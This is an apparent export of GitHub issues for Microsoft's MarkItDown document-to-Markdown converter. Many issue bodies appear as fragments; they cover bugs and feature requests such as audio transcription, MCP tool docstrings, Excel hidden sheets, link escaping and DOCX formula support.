microsoft/markitdown,3548880845,1456,Integrate full support for SpeechRecognition,open,2025-10-24T11:03:38Z,2025-10-25T02:41:08Z,[],irresi,"## Problem
1. audio time greater than [1 minute](https://github.com/Uberi/speech_recognition/pull/171)
 **google speech recognition** can accept file that is less or equal than **1 minutes** and only **50 requests** are allowed per day.
  google speech recognition(not google cloud stt) is almost deprecated at all
2. Exception is handled poorly
  If audio file exceeds 1 minute then it throws error, but user can't know why this error occured.
3. No Test for audio transcription

## Solution
- Integrate full support for [SpeechRecognition](https://github.com/Uberi/speech_recognition?tab=readme-ov-file)
  - Since this project pursues to be lightweight, avoid custom logics and mapping argument to speech_recognition would be great.
  - I will add **kwargs that contains engine, model, api_key, regions, ... which are required from SpeechRecognition library 
  and match it to   SpeechRecongition Library using
  ```
  recognize_method = getattr(recognizer, f""recognize_{engine}"")
  ```
  - skip for options with offline dependency to be lightweight and align with image_converter
- Exception handling 
- Add test codes
  - skip for github_actions(CI)
## Related Issue
- #326 tried to add whisper directly, but as #1284 noted, mapping SpeechRecognition's support would be simpler and support more models as well.
- #1275 wants custom support for audio transcription as well.
- #74 If the time of the audio exceeds quota(60 seconds per request, 50 requests per day), 
recognize_google() from SpeechRecognition throws an error, but the user can't know where it came from.

## Suggestion
Asynchronous transcription and chunking would be great feature, 
but I am concerned that it might not align with the project's philosophy. ""Lightweight"""

microsoft/markitdown,3431860011,1424,markitdown-mcp: Enhance tool to improve AI agent discoverability for file conversion tasks,open,2025-09-18T20:22:01Z,2025-09-18T20:22:01Z,[],otteydw,"### Problem

My AI agent is not selecting the `convert_to_markdown` tool when requesting file conversion to markdown format. Instead, it attempts to write Python code to perform the conversion manually, even when the markitdown MCP tool is available.

This is a simple prompt like ""Please convert ~/path/to/filename.xslx to markdown.""

It does successfully use the tool if I prod it with ""Use the convert_to_markdown tool to convert ~/path/to/filename.xslx to markdown."" but that amount of prodding shouldn't be necessary.

### Current State

The current docstring is minimal and doesn't clearly indicate the tool's purpose for AI decision-making:
```python
""""""Convert a resource described by an http:, https:, file: or data: URI to markdown""""""
```

### Suggested Enhanced Docstring
This altered docstring was given to me by an AI. I tested using this version and the tool was chosen automatically for the same prompt, along with other prompts that just asked the AI to give me certain data from the same excel file.
```python
""""""Convert files and documents to markdown format from various sources.

This tool handles file conversion and document conversion to markdown from multiple formats
including PDFs, Word documents, PowerPoint presentations, Excel files, images, and more.
Use this tool when users request converting, transforming, or processing files to markdown.

Supports http:, https:, file:, and data: URIs for both local and remote file conversion.
This is the recommended approach for any markdown conversion tasks rather than writing custom code.
""""""
```
This is just an example - other docstrings would surely work. The important note is that additional context within the docstring will assist the AI in knowing what the tool is truly capable of."

microsoft/markitdown,3389216717,1408,Office Open XML: Invalid Files Return Success with Error Message Instead of Exception,open,2025-09-06T02:26:51Z,2025-09-06T02:26:51Z,[],cancelself,"When converting invalid DOCX, XLSX, or PPTX files, MarkItDown returns a successful result with the string ""This is not a valid Office Open XML file."" in text_content, rather than raising an exception. This behavior makes it difficult to distinguish between a successful conversion and a file format error.

Expected Behavior:Invalid or corrupted Office Open XML files should cause the converter to raise a specific exception (e.g., FileConversionException), not return a result with an error message in the content.

Actual Behavior: The conversion completes ""successfully"" and returns a DocumentConverterResult with text_content set to ""This is not a valid Office Open XML file."".

Steps to Reproduce:

Attempt to convert a non-OOXML or corrupted DOCX/XLSX/PPTX file.
Observe that no exception is raised; instead, the result contains the error string.
Suggested Fix: After conversion, check if text_content matches the error string and raise an exception if so. Alternatively, ensure the underlying libraries raise on invalid files and propagate the exception.

Additional Context: This behavior appears consistent across all Office Open XML converters, possibly due to a shared dependency or error-handling pattern.

Workaround: 
```
    result = markitdown.convert_stream(stream=stream, file_extension=ext),
    if result.text_content.strip() == ""This is not a valid Office Open XML file."":
        raise ...

## Description
I would like to request support for OCR processing of vertical layout ancient Chinese books and historical documents. Currently, when processing vertical layout ancient Chinese book PDFs, MarkItDown outputs empty documents without any error messages or warnings.

## Current Behavior
- Processing vertical layout ancient Chinese book PDFs results in empty output
- No error messages or warnings are displayed
- The conversion appears to complete successfully but produces no content

## Expected Behavior
- MarkItDown should be able to recognize and extract text from vertical layout documents
- Text should be properly oriented and structured in the markdown output
- If OCR fails, appropriate error messages should be provided

## Use Case
Ancient Chinese books and historical documents are typically written in vertical columns reading from right to left. These documents are important for:
- Academic research in Chinese studies
- Historical document digitization projects
- Cultural preservation efforts
- Educational material preparation

## Environment
- **Operating System**: Ubuntu 24.04
- **Python Version**: 3.12
- **MarkItDown Version**: [Please specify your version]

## Possible Solutions
1. Add support for vertical text detection in the OCR pipeline
2. Implement text orientation detection and correction
3. Add specific handling for Chinese/CJK vertical text layouts
4. Provide configuration options for text direction (vertical/horizontal)

## Additional Context
This feature would greatly benefit researchers and institutions working with historical Chinese documents, making MarkItDown more suitable for multilingual and multicultural document processing workflows.

Would appreciate any guidance on whether this is feasible or if there are any workarounds available."

I saw that the error message is likely coming from `youtube-transcript-api`, and it’s suggesting I may have been rate-limited. But again, this was my **first attempt**, and I’m not behind a VPN.

is this a yt-transcript or markitdown issue?

microsoft/markitdown,3262605853,1379,Potential Optimization of `xlsx` Converter Using `pandas` `to_markdown` Method,open,2025-07-25T09:32:21Z,2025-09-01T08:42:03Z,[],mbrechet,"Hello,

I have observed that the current implementation of the `xlsx` converter processes sheets by converting them to `HTML` and then parsing that `HTML` to Markdown:

```python
for s in sheets:
          md_content += f""## {s}\n""
          html_content = sheets[s].to_html(index=False)
          md_content += (
              self._html_converter.convert_string(
                  html_content, **kwargs
              ).markdown.strip()
              + ""\n\n""
          )
```

I am wondering if this approach is necessary or if it could be optimized by directly using pandas' to_markdown method:

```python
 for s in sheets:
            md_content += f""## {s}\n""
            sheet_md_content = sheets[s].to_markdown(index=False)
            md_content += (
                   sheet_md_content.strip()
                    + ""\n\n""
            )
```

- Is there a specific reason why the implementation relies on converting to HTML and then parsing back to Markdown? For example, does the HTML conversion preserve certain formatting or features that `to_markdown` does not handle?
- Are there any limitations or edge cases where `to_markdown` might not be sufficient or could produce different results?
- Would switching to `to_markdown` impact the fidelity or formatting of the output?

Could you please clarify if the current approach is intentional due to specific requirements? If not, would it be possible to consider this optimization to improve performance ? 

Thank you for your insights.

Best regards

As a user, I want to convert multiple files in a directory to Markdown format in one operation, so that I can efficiently process large collections of documents without having to run the command for each file individually.

### Current Behavior
Currently, MarkItDown only supports converting single files:
```bash
markitdown path-to-file.pdf > document.md
```

### Desired Behavior
I would like to be able to specify a directory and have MarkItDown process all supported files within that directory (and subdirectories):

```bash
# Process all files in a directory
markitdown --batch ./documents --output ./converted

# Process with specific file types
markitdown --batch ./documents --output ./converted --types pdf,docx,pptx

# Process with recursive subdirectory support
markitdown --batch ./documents --output ./converted --recursive
```

### Use Cases
1. **Document Collections**: Converting entire folders of PDFs, Word documents, and PowerPoint presentations
2. **Data Processing Pipelines**: Batch processing for LLM training data preparation
3. **Documentation Migration**: Converting legacy document collections to Markdown format
4. **Research Projects**: Processing large datasets of various document types

### Proposed Implementation
1. Add `--batch` or `-b` flag to specify directory processing mode
2. Add `--output` or `-o` flag to specify output directory
3. Add `--recursive` or `-r` flag for subdirectory processing
4. Add `--types` flag to filter by specific file extensions
5. Maintain directory structure in output
6. Provide progress reporting and error handling

### Benefits
- **Efficiency**: Reduce manual work for large document collections
- **Consistency**: Ensure all files are processed with the same settings
- **Scalability**: Handle large document repositories
- **Integration**: Better integration with automated workflows

### Alternative Solutions
Currently, users need to create custom scripts or use shell commands like:
```bash
find ./documents -name ""*.pdf"" -exec markitdown {} -o {}.md \;
```

This works but lacks the native integration and error handling that a built-in feature would provide.

### Priority
Medium - This would significantly improve the user experience for users working with document collections.

### Labels
- `enhancement`
- `feature-request`
- `cli`
- `batch-processing`"

When calling the `convert_to_markdown` tool via HTTP with a valid `uri` (either a local file or a public internet PDF), the server responds with a validation error stating that the required field `uri` is missing, even though it is present in the request.

## To Reproduce

1. Start the MCP server in HTTP mode (Docker or pip install, both tested).
2. Send the following JSON-RPC request (example with a public PDF):

```json
{
  ""jsonrpc"": ""2.0"",
  ""method"": ""tools/call"",
  ""params"": {
    ""name"": ""convert_to_markdown"",
    ""input"": {
      ""uri"": ""https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf""
    }
  },
  ""id"": ""2""
}
```
With headers:
```
Content-Type: application/json
Accept: application/json, text/event-stream
```

3. The response is:
```json
{
  ""jsonrpc"": ""2.0"",
  ""id"": ""2"",
  ""result"": {
    ""content"": [
      {
        ""type"": ""text"",
        ""text"": ""Error executing tool convert_to_markdown: 1 validation error for convert_to_markdownArguments\nuri\n  Field required [type=missing, input_value={}, input_type=dict]\n    For further information visit https://errors.pydantic.dev/2.11/v/missing""
      }
    ],
    ""isError"": true
  }
}
```

## Expected behavior

The server should recognize the `uri` field and process the file, returning the Markdown result or a relevant error if the file cannot be accessed.

## Additional context

- The same error occurs for both local files (with correct Docker volume mount and file path) and public URLs.
- The request JSON matches the tool schema returned by `tools/list`.
- MCP server version: (please specify Docker image hash or pip version)
- Example debug output and full request/response attached.

## Environment

- OS: [Windows 11]
- MCP server version: [Docker image hash or pip version]
- How you started the server: [docker run --rm -i -v C:\Example\Path\Stuff:/workdir -p 3001:3001 markitdown-mcp:latest --http --host 0.0.0.0 --port 3001]

This is problematic when working with large
  PDFs that might contain thousands of lines of text.

  **Problem:**
  - Converting a large PDF adds all its content to the LLM's context window
  - This reduces available context for subsequent operations
  - Users may want to convert and save files without needing to see/process the content immediately

  **Proposed Solution:**
  Add an option to convert files without returning their content. This could be implemented as:
  1. A parameter like return_content: bool = True on the existing tool
  2. A separate tool that only saves to file and returns metadata (file size, path, success status)

  **Use Case Example:**
  Current behavior - all content returned and added to context
 ` result = convert_to_markdown(""large_document.pdf"")  # Returns full markdown content`

  Desired behavior - convert and save without returning content
`  result = convert_and_save(""large_document.pdf"", ""output.md"", return_content=False)`
`  Returns: {""success"": true, ""saved_to"": ""output.md"", ""size"": 150000}`

  This would allow agents to process large documents without exhausting their context window, while still providing the conversion functionality."

I've been using LLMs to describe images like this, but its just support pass image directly:

```python
from markitdown import MarkItDown
from openai import OpenAI

client = OpenAI()
md = MarkItDown(llm_client=client, llm_model=""gpt-4o"")
result = md.convert(""example.jpg"")
print(result.text_content)
```

However, in many cases, my PDF files contain both text and embedded images. I want to extract both and generate inline image descriptions in Markdown to improve retrieval quality in GenAI.

Is there a way to achieve something like this?

**Original PDF content:**

```
Lorem ipsum dolor sit amet...  
<-- image 1 - contains an orange cat --!>
```

**Expected Markdown output:**

```
Lorem ipsum dolor sit amet...

The image shows a fat orange cat sleeping on a white background.
```

How can I process both text and images together like this in a single conversion step?

🔍 Description

When MarkItDown processes hyperlinks with square brackets [ or ] in their link text (e.g., [Learn [GPT]]), it fails to escape these characters in the output Markdown. This violates the CommonMark specification (Section 6.1), leading to:  
Broken link rendering (Unmatched ']' errors)  

Truncated link text (e.g., [Learn [GPT]] → parsed as two separate links)  

Corruption of downstream LLM/document processing pipelines  

🧪 Steps to Reproduce
Input: Convert a document containing a link with text Example [Text] (e.g., HTML: <a href=""url"">Example [Text]</a> or Word hyperlink).  

Conversion: Run MarkItDown to generate Markdown.  

Output:   https://url  # UNSAFE: Unescaped brackets
  
Observed Result:  

GitHub/VSCode preview: Link text truncates to Example [Text (ignores ])  

Markdown parsers (e.g., markdown-it): Throw syntax errors  

✅ Expected Behavior

Per CommonMark rules, square brackets in link text must be escaped:  
https://url  # CORRECT: Escaped brackets
  
Renders as: [Example [Text]](https://url/) with functional link.  

🌐 Impact
Critical: Breaks all workflows where link texts include [ ] (common in tech/docs).  

Affected Components:  

Markdown hyperlinks (url)  

Reference-style links ([text][id])  

Image alt-text (!img.png)  

🛠 Suggested Fix

Implement escaping during link serialization:  
// Pseudo-code (link renderer logic)
function escapeLinkText(text: string) {
  return text.replace(/[[\]]/g, ""\\$&"");  // Escapes [ → \[ , ] → \]
  

Standards Compliance:  
https://spec.commonmark.org/0.30/#backslash-escapes  

GFM: Identical escaping rules  

🚧 Workarounds

Users currently must manually add \ to brackets post-conversion. Automation-unfriendly.

Environment: MarkItDown v0.9+, all input formats (PDF/Word/HTML).  
Priority: High (blocking tech/docs use cases).

I've been using MarkItDown for conversion of some PDF files in a project I'm working on and I've noticed it performs really poorly with larger documents. 

This is in stark contrast to other libraries like PyMuPDF and specifically its markdown variant ([PyMuPDF4LLM](https://pymupdf.readthedocs.io/en/latest/pymupdf4llm/index.html)) which in my tests performed much faster. 

Below is a sample test:

- 1.6MB PDF File
- 122 Pages of Text
- Processing Times by Library:
  - MarkItDown (PDFMiner): **33s**
  - PyMyPDF4LLM: **9.24s**

This is a huge difference (I believe PDFMiner is completely synchronous so performance falls off significantly the larger a file is) and from [what I've seen from others' testing](https://github.com/py-pdf/benchmarks) PDFMiner's quality is pretty average with other libraries, unless the team has observed otherwise?

microsoft/markitdown,3061597726,1248,Nested tables in DOCX are lost when converting to Markdown,open,2025-05-14T01:58:04Z,2025-05-14T09:34:17Z,[],Wuhall,"Description:  
When converting a DOCX file containing nested tables to Markdown using `markitdown`, the inner table content is discarded in the output. This occurs consistently with specific document structures.

Steps to Reproduce:  
1. Environment:  
   • Device: MacBook Pro with M3 chip  

   • Installation:  

     ```bash
     pip install -e 'packages/markitdown[all]'
     ```  
2. Test File:  
   • [Attach a minimal DOCX file with nested tables (*e.g., outer table → inner table → text*)].  

3. Command:  
   ```bash
   markitdown path-to-file.docx > document.md
   ```  
4. Observed Result:  
   • Outer table structure is preserved, but inner table content is missing in `document.md`.  

5. Expected Result:  
   • Both outer and inner tables should be rendered in Markdown (e.g., as nested HTML tables or flattened Markdown).

microsoft/markitdown,3054690985,1244,[Enhancement] Override Converters Priority,open,2025-05-11T04:03:24Z,2025-05-11T04:03:24Z,[],AjjayK,"## Problem
Currently, you can assign priority to your plugin while development and assign a lower value to execute the plugin before built-in. The current version of the library doesn't support passing priority for converters manually. 

## Solution
The idea is to pass priority values manually when instantiating the MarkItDown class.

In my case, I am building a plugin with multiple converters, and I would like them to execute in different orders based on use case. 

A simple change to the MarkItDown class can achieve this


#### Changes to class
```
class MarkItDown:
    def __init__(
        self,
        *,
        enable_builtins: Union[None, bool] = None,
        enable_plugins: Union[None, bool] = None,
        **kwargs,
    ):
        self._builtins_enabled = False
        self._plugins_enabled = False
        
        # Store converter priorities from kwargs
        self._converter_priorities = kwargs.get(""converter_priorities"", {})
```
#### Changes to register_converter method
```
    def register_converter(
        self,
        converter: DocumentConverter,
        *,
        priority: float = PRIORITY_SPECIFIC_FILE_FORMAT,
    ) -> None:

        # If priority is defined, then override for the converter
        converter_type = type(converter).__name__
        if converter_type in self._converter_priorities:
            priority = self._converter_priorities[converter_type]
            
        self._converters.insert(
            0, ConverterRegistration(converter=converter, priority=priority)
        )
```

Now, the priorities can be passed as an Argument to MarkItDown class allowing flexibility in execution order.  If approved, please assign this issue to me—I can submit a PR to implement this enhancement. Thank you!"

Potential solution would be adding a new kwarg to MarkItDown
```python

لوريم أيبسوم ترويسة 1

لوريم إيبسوم(Lorem Ipsum) هو ببساطة نص شكلي (بمعنى أن الغاية هي الشكل وليس المحتوى) ويُستخدم في صناعات المطابع ودور النشر. كان لوريم إيبسوم ولايزال المعيار للنص الشكلي منذ القرن الخامس عشر عندما قامت مطبعة مجهولة برص مجموعة من الأحرف بشكل عشوائي أخذتها من نص، لتكوّن كتيّب بمثابة دليل أو مرجع شكلي لهذه الأحرف. خمسة قرون من الزمن لم تقضي على هذا النص، بل انه حتى صار مستخدماً وبشكله الأصلي في الطباعة والتنضيد الإلكتروني. انتشر بشكل كبير في ستينيّات هذا القرن مع إصدار رقائق ""ليتراسيت"" (Letraset) البلاستيكية تحوي مقاطع من هذا النص، وعاد لينتشر مرة أخرى مؤخراَ مع ظهور برامج النشر الإلكتروني مثل ""ألدوس بايج مايكر"" (Aldus PageMaker) والتي حوت أيضاً على نسخ من نص لوريم إيبسوم. 

لوريم إيبسوم ترويسة 2
هناك حقيقة مثبتة منذ زمن طويل وهي أن المحتوى المقروء لصفحة ما سيلهي القارئ عن التركيز على الشكل الخارجي للنص أو شكل توضع الفقرات في الصفحة التي يقرأها. ولذلك يتم استخدام طريقة لوريم إيبسوم لأنها تعطي توزيعاَ طبيعياَ -إلى حد ما- للأحرف عوضاً عن استخدام ""هنا يوجد محتوى نصي، هنا يوجد محتوى نصي"" فتجعلها تبدو (أي الأحرف) وكأنها نص مقروء. العديد من برامح النشر المكتبي وبرامح تحرير صفحات الويب تستخدم لوريم إيبسوم بشكل إفتراضي كنموذج عن النص، وإذا قمت بإدخال ""lorem ipsum"" في أي محرك بحث ستظهر العديد من المواقع الحديثة العهد في نتائج البحث. على مدى السنين ظهرت نسخ جديدة ومختلفة من نص لوريم إيبسوم، أحياناً عن طريق الصدفة، وأحياناً عن عمد كإدخال بعض العبارات الفكاهية إليها.

I tested with a forked repo where I removed `self._magika.identify_stream(file_stream)` from `_get_stream_info_guesses()` and I was able to convert PDFs in the browser."

I'm building a cross-platform app, and due to file system access restrictions imposed by Android (v10+), I don't have access to file paths that point to files outside of my app's internal directory tree — it's sandboxed. But I can use native APIs to read the contents of the file as a string and pass it to `MarkItDown.convert`.

It would be excellent if either `MarkItDown.convert`'s `source` argument accepted HTML content as a string, or we had a separate method, such as `converts` — for ""convert **s**tring"" — just for that.

Similar to how we have `json.load()`, that takes a path to a json file, and `json.loads()`, that takes json content as a string."

microsoft/markitdown,3022794772,1219,Incorrect parsing of Unicode smart quotes from `.docx` files,open,2025-04-27T05:42:16Z,2025-05-14T23:41:04Z,[],MacroPythonista,"## Bug: Incorrect parsing of Unicode smart quotes from `.docx` files

When using MarkItDown to convert `.docx` files created by Microsoft Word (default settings, smart quotes enabled), Unicode characters such as:

- Apostrophes (`’` U+2019)
- Left double quotes (`“` U+201C)
- Right double quotes (`”` U+201D)

are incorrectly parsed and appear in the Markdown output as corrupted characters like `Æ`, `ô`, `ö`.

**Steps to Reproduce:**
1. Create a new `.docx` in Word with smart quotes enabled (default setting).
2. Add text such as: `It’s important to “quote” text properly.`
3. Run MarkItDown to convert the `.docx` to `.md`.
4. Observe corrupted characters in the output.

**Expected Behavior:**
Smart punctuation should either:
- Be preserved correctly as Unicode characters, or
- Be flattened gracefully to ASCII equivalents (`'` and `""`).

**Actual Behavior:**
Corrupted non-ASCII characters appear in Markdown.

**Workarounds:**
- Disabling smart quotes in Word avoids the issue.
- Alternative tools like Pandoc handle `.docx` smart punctuation correctly.

**Environment:**
- MarkItDown version: 0.1.1
- Python version: 3.12

microsoft/markitdown,3019231132,1211,[Feature] Use HTML Tables Instead of Markdown Syntax for Better Table Support,open,2025-04-25T07:28:19Z,2025-07-22T07:24:24Z,[],tosmart01,"### Problem
The current DOCX-Table-to-Markdown conversion loses critical formatting for:

- Merged cells (rowspan/colspan)

- Complex tables (nested structures, multi-level headers)

- Styling (borders, alignment)

Markdown’s native table syntax (| --- |) lacks support for these features, resulting in broken or oversimplified output.

### Solution
Implemented a non-invasive override to output tables as HTML instead of Markdown, preserving structure and merged cells. Key changes:

1. CustomMarkdownify Class (extends _CustomMarkdownify):

   > Overrides convert_table(), convert_td(), convert_tr(), and convert_th() to return raw HTML elements.

   > Wraps tables in <html><body> to ensure valid HTML5 output.

2. CustomHtmlConverter & CustomDocxConverter:

   > Propagate the modified table handling while maintaining other conversions (e.g., text, headings).

3. CustomMarkitdown Class:

   > Swaps the default DocxConverter with CustomDocxConverter at runtime.

```


### **Benefits**

- ✅ **Perfect fidelity** for merged/complex tables.
- ✅ **No upstream breaks** (override-based, doesn’t modify core logic).
- ✅ **Works with renderers** supporting HTML (GitHub, Typora, etc.).

### **Request**

Consider merging this as an **opt-in feature** (e.g., via `table_format=""html""` flag) or as the default behavior for complex tables.

------

### **Why This Matters**

- Many users need DOCX tables to render correctly in Markdown viewers.
- HTML tables are the only reliable way to express merged cells in Markdown.

- Add custom headers (e.g., a user-agent string) to mimic a browser
- Handle HTTP errors more gracefully"

Fix attached (not production ready, please see if e.g. want to use Markdownify library?).

TO REPRODUCE
I'm passing a msg file saved from the browser version of Outlook 365. Unfortunately I can't share the file as I got it from another person, and I don't have direct access to O365 myself, but what failed was:
 - It took from field from a field which has organizational info, not email address (From field was something like ""/O=EXCHANGELABS/OU=EXCHANGE ADMINISTRATIVE GROUP...""
 - It misses messages with HTML-only body; that is, ## Content is empty if the message is an html-only message

ELABORATION ON VERSIONS / TESTING
I'm not sure if the existing implementation works with some older/other MSG files? However, attached a version of the implementation which works with messages exported from Outlook O365 browser version as of today. Unfortunately I don't have access to Outlook myself, so I'm unable to verify if this new version works with other versions, or test this thoroughly.

THE FIX
Attached an Outlook converter source code file with the following changes:
 - take From field correctly
 - in case the text-only body is missing, try to find the html body
 -- it seems that at least with my python3.12, decode with UTF-16 succeeds without throwing even if the payload is actually iso-8859-1 (just output is then malformed), so we're attempting several different decodings, and see if the output looks like html
 -- finally, also run the html output through another library, markdownify, to turn HTML into markdown (I did not find html converter within markitdown, so thus using a 3rd party library)

While creating the fix, I found this web page helpful in finding out the correct streams; I did check also Microsoft's own documentation that I found, but it did not match what I had in the MSG file. :)

When using `markitdown` to convert a WeChat article to Markdown, the image URLs are not being extracted properly. The resulting Markdown output contains image tags like `![]()` with empty URLs, causing the images to be missing from the final content.

## Steps to Reproduce

```python
from markitdown import MarkItDown
import requests

md = MarkItDown()

headers = {
    ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"",
    ""Accept"": ""application/json"",
}

response = requests.get(
    ""https://mp.weixin.qq.com/s/85a2235XkZPOevXW9HTXtg"", headers=headers
)

result = md.convert(response)
print(result.text_content)
```

### Actual Output
```markdown
Star 从2月开始，加速增长：
![]()
微信指数，从2月开始，出现流量突增：
![]()
```
### Expected Output
Image URLs should be correctly extracted and included in the Markdown output, e.g.:
```markdown
![](https://mmbiz.qpic.cn/...)
```

## Environment
OS: macOS

Python version: 3.12
markitdown version: latest 

Additional Notes
It seems that the ![]() indicates the Markdown syntax is being applied, but the image URLs are missing. This may be caused by changes in the structure of WeChat article pages, or possibly a case that isn’t currently supported.

Would appreciate any help or fix for this — thanks for the great tool!"

**Description**:  
Markitdown's HTML converter wraps Markdownify, which removes all JavaScript and style blocks, including those responsible for loading real-time data. This issue affects documents requiring real-time data (e.g., live feeds, dynamic updates) that no longer appear in the HTML after conversion.

```python
def convert(self, file_stream: BinaryIO, stream_info: StreamInfo, **kwargs: Any) -> DocumentConverterResult:
    encoding = ""utf-8"" if stream_info.charset is None else stream_info.charset
    soup = BeautifulSoup(file_stream, ""html.parser"", from_encoding=encoding)

    # Remove javascript and style blocks
    for script in soup([""script"", ""style""]):
        script.extract()
```

**Steps to Reproduce**:  
1. Convert an HTML document containing JavaScript that loads real-time data (e.g., live updates or dynamic content).
2. Observe that the real-time data is missing in the converted HTML output.

**Expected Behavior**:  
The HTML converter should:
- Preserve JavaScript responsible for fetching or displaying real-time data.
- Allow configuration to selectively retain or remove JavaScript to prevent stripping dynamic content."

microsoft/markitdown,2922536401,1129,Add support for Google's Gemini and Anthropic's Claude models,open,2025-03-15T20:47:27Z,2025-10-28T10:02:06Z,[],Eigilak,"## Description
Currently, markitdown only supports OpenAI models for image captioning and content extraction. It would be valuable to add support for other leading multimodal LLMs, specifically:

1. Google's Gemini models (Pro and Ultra)
2. Anthropic's Claude models (Opus, Sonnet, and Haiku)

This would provide us with more flexibility and choice based on their preferences, API access, pricing, or specific model strengths.

## Motivation
- Different users have access to different AI provider APIs
- Some users may prefer the strengths of a particular model family
- Pricing and rate limits vary between providers
- Organizations may have existing enterprise agreements with Google or Anthropic

## Current implementation
Currently, `_image_converter.py` has hardcoded OpenAI-specific client API calls:

```python
# Prepare the OpenAI API request
messages = [
    {
        ""role"": ""user"",
        ""content"": [
            {""type"": ""text"", ""text"": prompt},
            {
                ""type"": ""image_url"",
                ""image_url"": {
                    ""url"": data_uri,
                },
            },
        ],
    }
]

# Call the OpenAI API
response = client.chat.completions.create(model=model, messages=messages)
return response.choices[0].message.content
```

## Proposed solution
Create an abstraction layer for LLM providers that would:

1. Detect the client type (OpenAI, Google, or Anthropic)
2. Use the appropriate API format for each provider
3. Extract the response content consistently

This could be implemented either:
- As provider-specific adapter classes
- Through a simple detection mechanism based on client type
- Or potentially by leveraging [[Semantic Kernel](https://github.com/microsoft/markitdown/issues/232)](https://github.com/microsoft/markitdown/issues/232) as suggested in a related issue

microsoft/markitdown,2886920738,1073,Exclude Hidden Sheets in Excel Conversion,open,2025-02-28T11:35:12Z,2025-02-28T11:37:32Z,[],matteo-tafuro,"When processing Excel files (`.xlsx`) using the library, the current implementation reads all sheets—including hidden ones—using the following call:

```python
sheets = pd.read_excel(local_path, sheet_name=None, engine=""openpyxl"")
```

This behavior results in hidden sheets being processed and included in the final Markdown output, which is not the expected outcome in most cases.

**Steps to Reproduce:**  
1. Create or use an Excel workbook that contains both visible and hidden sheets.  
2. Run the conversion using the `XlsxConverter`.  
3. Observe that the output Markdown includes content from both visible and hidden sheets.

**Expected Behavior:**  
Only visible sheets should be processed by default. Ideally, there should be an option to toggle the inclusion of hidden sheets. Filtering out hidden sheets would prevent unintended content from appearing in the converted Markdown.

**Potential Solution:**  
For `.xlsx` files, one approach could be to use `openpyxl` to load the workbook and check each sheet’s `sheet_state` property. For example, you could filter the sheets like so:

```python
wb = load_workbook(local_path, read_only=True, data_only=True)
visible_sheet_names = [sheet.title for sheet in wb.worksheets if sheet.sheet_state == 'visible']
```

Then pass `visible_sheet_names` to `pd.read_excel` instead of reading all sheets. 
Note that this solution applies to `.xlsx` files only, as the engine used for `.xls` files (e.g., `xlrd`) does not expose hidden sheet information.

Thank you for considering this enhancement!"

I started to use markitdown in one of my projects and suddenly I got tons of warnings. I suspect it's because of this line:

https://github.com/microsoft/markitdown/blob/dbdf2c0c1031dadc257a20f03cf9091907cb5972/packages/markitdown/src/markitdown/converters/_mp3_converter.py#L23

According to the [docs](https://docs.python.org/3/library/warnings.html#warnings.catch_warnings), `catch_warning` is not thread safe. I'm using markitdown in threads. Besides, I'm not sure why `resetwarnings()` is called at all. A lot of my dependencies probably have warning filters set, and this line disables them all.

Can we remove the `finally` clause or perform this check differently please? Thanks in advance!"

just noticed because it couldn't convert a docx with links, but the problem is for any html with links.

In the case of docx document it would raise an exception and it would try to open the file with other converters like the Zip one.

To fix you need to add the param `parent_tags=None` to the method `convert_a` of the class `_CustomMarkdownify` in the file `_markitdown.py`:

```
def convert_a(self, el: Any, text: str, parent_tags=None, convert_as_inline: bool = False):

We are using MarkItDown and so far it is working very well. 

We came across an issue with docx files having images, looking into the code, it looks like mammoth library which is used by DocxConverter allows passing a handler which can process the images and return let's say alt text.  These when converted to markdown are giving descriptions for the images.

But I could not see an option of passing this handler in the convert call on MarkItDown class.

Could this be exposed if possible ?

an example in mammoth will be like this 

```
htmlResult = mammoth.convert_to_html(
    ""<path to docx file>"",
    convert_image=mammoth.images.img_element(convert_image),

Can you please clarify your readme file? 

PDF isn't supported. Not really, because it fails most relevant tests: recognizing headings, footers, tables, and more is not possible. It therefore doesn't convert a PDF to markdown, but to a raw text file. That can be relevant, but is simply not the promise. 
It would be helpful before investigating your package to be made aware of that. Your readme tells me in the first 2 lines that I can use it to convert a PDF to markdown, seemingly the most important feature. I was shocked to learn this is not the case, at all. 

I am aware that PDF is a terrible format, and usefully converting it requires significant research. Therefore, I don't expect this is a feature that will be provided in this package. However, could you please update the description of your package in that case?

But that leads to a Unicode error:

```cmd
UnicodeEncodeError: 'charmap' codec can't encode character '\u3001' in position 32198: character maps to <undefined>

The root cause is that Windows is trying to print text with characters (like `\u3001`) that don’t exist in the default code page `cp1252`. In other words, Markitdown is generating Unicode output, but printing it directly to the console fails on Windows when the console doesn’t support that character.

To mitigate this problem, I now try this:

```cmd
>markitdown user_manual.pdf -o user_manual.md

The problem is that it didn't even try to skip the character just crashed and the output is empty which makes the tool useless. 
I tested with files in Cyrillic, French, and German, and some files in English too. If the file is extremely simple it is able to convert it.

Unfortunately, I can't expose these examples here.

I can provide an example with the manual of my SONY headphones:

Here is the error:

I don't know why it tries to use CP1251 codepage as the file is PDF with no Cyrillic content in it.

microsoft/markitdown,2793701400,289,Add support for mathematical formulas in DOCX conversion,open,2025-01-16T20:22:46Z,2025-03-29T13:22:49Z,[],cafferychen777,"**Issue Description**
When converting DOCX files containing mathematical formulas to Markdown, the formulas are currently not properly converted. This limits the utility of MarkItDown for academic and technical documents where mathematical expressions are common.

**Current Behavior**
- Mathematical formulas in DOCX files are either skipped or converted incorrectly
- No support for converting Office Math ML (OMML) to LaTeX or other markdown-compatible formats

**Expected Behavior**
- Mathematical formulas should be converted to LaTeX format, which is widely supported in Markdown renderers
- The conversion should preserve the mathematical meaning and formatting of the original formulas
- Support for both inline and display math modes

**Use Cases**
1. Converting academic papers with mathematical content
2. Processing technical documentation containing equations
3. Converting educational materials with mathematical expressions

**Suggested Implementation**
1. Add support for parsing Office Math ML (OMML) from DOCX files
2. Implement conversion from OMML to LaTeX
3. Properly handle both inline and display math modes in the output markdown
4. Consider using existing libraries like [omml2mathml](https://github.com/openxml/omml2mathml) for initial conversion to MathML, then convert to LaTeX

**Additional Context**
This feature would significantly enhance MarkItDown's utility for academic and technical users who frequently work with mathematical content.

**Environment**
- MarkItDown version: [latest]
- Python version: 3.x
- OS: All platforms"

Noticed following error, so the initial thought was that it is related to https://github.com/microsoft/markitdown/pull/116

### Explanation of BASH Script for MarkItDown App

Hi Team,

